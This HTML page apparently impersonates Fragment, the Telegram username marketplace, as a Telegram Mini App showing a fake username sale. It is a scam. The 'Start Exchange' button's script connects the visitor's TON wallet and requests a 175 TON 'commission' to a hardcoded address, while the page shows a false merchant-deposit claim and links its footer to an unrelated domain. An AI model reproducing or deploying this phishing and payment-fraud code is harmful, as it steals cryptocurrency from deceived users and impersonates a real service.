<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fragment - Mini App</title>
    <!-- Подключаем TON Connect SDK -->
    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
    <style>
        body {
            background-color: #1A1F2B;
            color: #FFFFFF;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
            margin: 0;
            padding: 0;
            font-size: 16px;
            line-height: 1.5;
        }
        .header {
            background-color: #252A36;
            padding: 12px 16px;
            border-radius: 0;
            margin: 0;
            width: 100%;
            box-sizing: border-box;
            display: flex;
            align-items: center;
        }
        .logo img {
            width: 120px;
            height: 24px;
        }
        .container {
            padding: 16px;
            max-width: 600px;
            margin: 0 auto;
            padding-bottom: 80px;
        }
        .title {
            font-size: 18px;
            font-weight: 600;
            color: #FFFFFF;
            width: 100%;
            text-align: center;
            display: block;
            margin-top: 8px;
            margin-bottom: 16px;
        }
        .deal-status {
            color: #34C759;
            font-size: 12px;
            font-weight: 500;
            padding: 2px 6px;
            background-color: rgba(52, 199, 89, 0.1);
            border-radius: 4px;
            display: inline-block;
            margin-left: 8px;
        }
        .deal-info {
            background-color: #1E2A3D;
            padding: 0;
            border-radius: 12px;
            margin-bottom: 16px;
        }
        .deal-header {
            background-color: #2D3D4D;
            padding: 8px 16px;
            border-top-left-radius: 12px;
            border-top-right-radius: 12px;
            display: flex;
            justify-content: space-between;
        }
        .deal-header label {
            font-size: 14px;
            color: #8A9BA8;
            font-weight: 600;
        }
        .deal-content {
            padding: 16px;
        }
        .deal-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
        }
        .deal-price, .commission {
            width: 48%;
        }
        .deal-price span, .commission span {
            font-size: 18px;
            font-weight: 600;
            color: #FFFFFF;
            display: inline-flex;
            align-items: center;
        }
        .ton-icon {
            width: 18px;
            height: 18px;
            margin-right: 4px;
        }
        .deal-price small, .commission small {
            font-size: 12px;
            color: #8A9BA8;
            display: block;
            margin-top: 4px;
        }
        .question {
            color: #8A9BA8;
            font-size: 12px;
            font-weight: 500;
            text-align: left;
            margin-top: 8px;
            cursor: pointer;
            text-decoration: none;
        }
        .contact-info p {
            display: flex;
            justify-content: space-between;
            background-color: #1E2A3D;
            padding: 12px;
            border-radius: 12px;
            margin: 8px 0;
            font-size: 14px;
        }
        .contact-info span {
            color: #00D4FF;
            font-weight: 500;
        }
        .button {
            background: linear-gradient(180deg, #00C4FF 0%, #00A8E6 100%);
            color: #FFFFFF;
            padding: 16px;
            border: none;
            border-radius: 12px;
            width: 100%;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            text-align: center;
            margin: 16px 0;
            text-transform: uppercase;
            box-shadow: 0 4px 12px rgba(0, 212, 255, 0.3);
        }
        .subscribe {
            background-color: transparent;
            color: #00D4FF;
            border: 1px solid #00C4FF;
            padding: 12px;
            border-radius: 12px;
            text-align: center;
            font-size: 14px;
            font-weight: 500;
            margin: 8px 0;
            cursor: pointer;
            display: block;
            width: 100%;
            box-sizing: border-box;
        }
        .notification {
            background-color: #00D4FF;
            color: #121C2E;
            padding: 16px;
            border-radius: 12px;
            margin: 16px 0;
            font-size: 14px;
            line-height: 1.5;
        }
        .trade-info {
            margin: 16px 0;
        }
        .trade-info h3 {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #FFFFFF;
        }
        .info-header {
            background-color: #2D3D4D;
            padding: 8px 16px;
            border-top-left-radius: 12px;
            border-top-right-radius: 12px;
            display: flex;
            color: #8A9BA8;
            font-size: 14px;
            font-weight: 600;
        }
        .info-row {
            display: flex;
            background-color: #1E2A3D;
            padding: 12px 16px;
            border-radius: 12px;
            margin-bottom: 8px;
            font-size: 14px;
            color: #8A9BA8;
        }
        .info-header span {
            text-align: left;
            padding-left: 4px;
        }
        .info-row span {
            color: #FFFFFF;
            font-weight: 500;
            text-align: left;
            padding-left: 4px;
        }
        .info-header span:nth-child(1), .info-row span:nth-child(1) {
            width: 30%;
        }
        .info-header span:nth-child(2), .info-row span:nth-child(2) {
            width: 30%;
        }
        .info-header span:nth-child(3), .info-row span:nth-child(3) {
            width: 40%;
        }
        .trade-info .info-row a {
            color: #FFFFFF;
            text-decoration: none;
        }
        .footer {
            display: flex;
            justify-content: space-between;
            padding: 16px;
            border-top: 1px solid #2D3D4D;
            position: fixed;
            bottom: 0;
            width: 100%;
            background-color: #1A1F2B;
            box-sizing: border-box;
        }
        .footer a {
            color: #8A9BA8;
            text-decoration: none;
            font-size: 14px;
            margin: 0 8px;
        }
        .footer a.active {
            color: #00D4FF;
        }
        .chat-icon {
            position: fixed;
            bottom: 16px;
            right: 16px;
            width: 56px;
            height: 56px;
            background-color: #00D4FF;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 12px rgba(0, 212, 255, 0.3);
        }
        .chat-icon::before {
            content: "💬";
            font-size: 24px;
        }
        .chat-icon .badge {
            position: absolute;
            top: -4px;
            right: -4px;
            width: 12px;
            height: 12px;
            background-color: #34C759;
            border-radius: 50%;
            border: 2px solid #1A1F2B;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">
            <img src="https://i.postimg.cc/L5dkxvR1/IMG-20250531-132834.jpg" alt="Fragment Logo">
        </div>
    </div>
    <div class="container">
        <div class="title">
            <span id="username">hold235</span>.t.me <span class="deal-status">Deal In Progress</span>
        </div>
        <div class="deal-info">
            <div class="deal-header">
                <label>Deal Price</label>
                <label>Commission</label>
            </div>
            <div class="deal-content">
                <div class="deal-row">
                    <div class="deal-price">
                        <span>
                            <svg class="ton-icon" viewBox="0 0 24 24">
                                <use href="#ton"></use>
                            </svg>
                            <span id="deal-price-ton">3500</span>
                        </span>
                        <small id="deal-price-usd">~ $11530.75</small>
                    </div>
                    <div class="commission">
                        <span>
                            <svg class="ton-icon" viewBox="0 0 24 24">
                                <use href="#ton"></use>
                            </svg>
                            <span id="commission-ton">175</span>
                        </span>
                        <small id="commission-usd">~ $576.54</small>
                    </div>
                </div>
                <div class="question"><a href="https://sub7.offerbid.bet/about.php">How does this work?</a></div>
            </div>
        </div>
        <div class="contact-info">
            <p>Telegram Username <span id="telegram-username">@hold235</span></p>
            <p>Web Address <span id="web-address">t.me/hold235</span></p>
            <p>TON Web 3.0 Address <span id="ton-address">hold235.t.me</span></p>
        </div>
        <button class="button" onclick="connectWallet()">Start Exchange</button>
        <button class="subscribe">Subscribe to updates</button>
        <div class="notification">
            You do not need to complete KYC verification, as the buyer is a verified merchant on a Fragment that has a security deposit of 💎 25,000.
        </div>
        <div class="trade-info">
            <h3>Trade Info</h3>
            <div class="info-header">
                <span>Deal Status</span>
                <span>TON - Username</span>
                <span>Recipient</span>
            </div>
            <div class="info-row">
                <span>Ready</span>
                <span>Swappable</span>
                <span><a href="https://tonviewer.com/Ef_BbsF16B4aReCFhXIOLh7qgIdLTClPvKU29ZWwLShisZ6P">Ef.BbsF16B4aReCFh...</a></span>
            </div>
        </div>
    </div>
    <div class="footer">
        <a href="https://fragment.com/">Top Auctions</a>
        <a href="https://sub7.offerbid.bet/about.php">About</a>
        <a href="https://sub7.offerbid.bet/about.php">Terms</a>
        <a href="https://sub7.offerbid.bet/about.php" class="active">Privacy</a>
    </div>
    <div class="chat-icon">
        <div class="badge"></div>
    </div>

    <!-- SVG Definitions -->
    <svg style="display: none;">
        <symbol viewBox="0 0 24 24" id="ton">
            <path fill="#00a8e6" d="M19.012 9.201L12.66 19.316a.857.857 0 0 1-1.453-.005L4.98 9.197a1.8 1.8 0 0 1-.266-.943a1.856 1.856 0 0 1 1.882-1.826h10.817c1.033 0 1.873.815 1.873 1.822a1.8 1.8 0 0 1-.274.951M6.51 8.863l4.633 7.144V8.143H6.994c-.48 0-.694.317-.484.72m6.347 7.144l4.633-7.144c.214-.403-.004-.720-.484-.720h-4.149z"></path>
        </symbol>
    </svg>

    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script>
        // Инициализация Telegram Web App
        const tg = window.Telegram.WebApp;
        tg.ready();

        // Инициализация TON Connect
        const tonConnect = new TonConnectSDK.TonConnect({
            manifestUrl: 'https://yourdomain.com/tonconnect-manifest.json' // Замените на URL вашего манифеста
        });

        // Загрузка данных из сервера
        async function loadConfig() {
            try {
                const response = await fetch('http://localhost:5000/config');
                const config = await response.json();

                // Обновление username
                const username = config.username || 'hold235';
                document.getElementById('username').textContent = username;
                document.getElementById('telegram-username').textContent = `@${username}`;
                document.getElementById('web-address').textContent = `t.me/${username}`;
                document.getElementById('ton-address').textContent = `${username}.t.me`;

                // Обновление цен
                document.getElementById('deal-price-ton').textContent = config.dealPriceTON || '3500';
                document.getElementById('deal-price-usd').textContent = `~ $${config.dealPriceUSD || '11530.75'}`;
                document.getElementById('commission-ton').textContent = config.commissionTON || '175';
                document.getElementById('commission-usd').textContent = `~ $${config.commissionUSD || '576.54'}`;
            } catch (error) {
                console.error('Error loading config:', error);
            }
        }

        // Функция подключения кошелька и отправки транзакции
        async function connectWallet() {
            try {
                // Проверяем, запущено ли приложение в Telegram
                if (!tg.initData) {
                    tg.showAlert('Ошибка: приложение должно быть запущено в Telegram.');
                    return;
                }

                // Запрашиваем подключение кошелька
                console.log('Запрашиваем подключение кошелька...');
                tg.showAlert('Пожалуйста, подключите кошелёк для продолжения.');
                await tonConnect.connect();

                // Проверяем, подключён ли кошелёк
                if (!tonConnect.connected) {
                    tg.showAlert('Кошелёк не подключён. Убедитесь, что у вас установлен Telegram Wallet, и попробуйте снова.');
                    return;
                }

                // Кошелёк подключён, продолжаем с транзакцией
                console.log('Кошелёк подключён, инициируем транзакцию...');
                const commissionTon = parseFloat(document.getElementById('commission-ton').textContent) || 175;
                const commissionNanoTon = Math.round(commissionTon * 1e9); // Конвертируем TON в нанотокены

                // Адрес получателя
                const recipientAddress = 'UQCLVZxRULA5wbk2I_pSFD6XWYjUsUemNRZ6c5CaUCKAtlpq';

                // Создаём транзакцию
                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 60, // Время действия транзакции (60 секунд)
                    messages: [
                        {
                            address: recipientAddress,
                            amount: commissionNanoTon.toString(), // Сумма в нанотокенах
                            payload: btoa('Commission payment') // Комментарий
                        }
                    ]
                };

                // Отправляем транзакцию
                const result = await tonConnect.sendTransaction(transaction);

                // Проверяем результат
                if (result) {
                    tg.showAlert(`Транзакция успешно отправлена! Сумма комиссии (${commissionTon} TON) отправлена на адрес ${recipientAddress}.`);
                } else {
                    tg.showAlert('Транзакция не выполнена. Проверьте баланс кошелька и попробуйте снова.');
                }
            } catch (error) {
                console.error('Ошибка:', error);
                if (error.message.includes('jsBridgeKey')) {
                    tg.showAlert('Ошибка: Убедитесь, что приложение запущено в Telegram, и Telegram Wallet установлен.');
                } else if (error.message.includes('manifest')) {
                    tg.showAlert('Ошибка: Некорректный manifestUrl. Убедитесь, что tonconnect-manifest.json доступен на вашем сервере.');
                } else {
                    tg.showAlert(`Произошла ошибка: ${error.message}. Проверьте подключение кошелька и попробуйте снова.`);
                }
            }
        }

        // Загружаем конфигурацию при запуске
        loadConfig();
    </script>
</body>
</html>
